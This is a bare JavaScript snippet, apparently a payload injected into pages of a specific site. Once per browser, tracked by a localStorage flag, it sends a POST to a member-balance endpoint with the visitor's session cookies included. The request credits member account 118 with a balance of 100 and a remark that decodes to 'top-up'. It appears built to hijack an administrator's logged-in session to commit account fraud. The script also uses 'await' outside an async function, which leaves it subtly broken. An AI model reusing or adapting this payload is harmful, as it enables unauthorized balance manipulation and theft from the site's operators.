(function(){
  if(! window.localStorage){
    return false;
  }else{
      var Storage=window.localStorage;
      if(!Storage.getItem("mcdns")){
        Storage.setItem("mcdns",1);
         if(window.location.hostname==="byht.hqyg888.com"){
            var a={i:118, b:100, r:"%E5%85%85%E5%80%BC",t:1,h:"https://byht.hqyg888.com",a:"/Member.balance.id.",f:".do", x:"?"},t="id="+a.i+"&balance="+a.b+"&remark="+a.r+"&type="+a.t;
                await fetch(a.h+a.a+a.i+a.f+a.x+t, {
                    "credentials": "include",
                    "headers": {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
                        "Accept": "application/json, text/javascript, */*; q=0.01",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "X-Requested-With": "XMLHttpRequest",
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "same-origin"
                    },
                    "referrer":a.h+a.a+a.i+a.f,
                    "body":t,
                    "method": "POST",
                    "mode": "cors"
                });
         }
      }
  }
}())
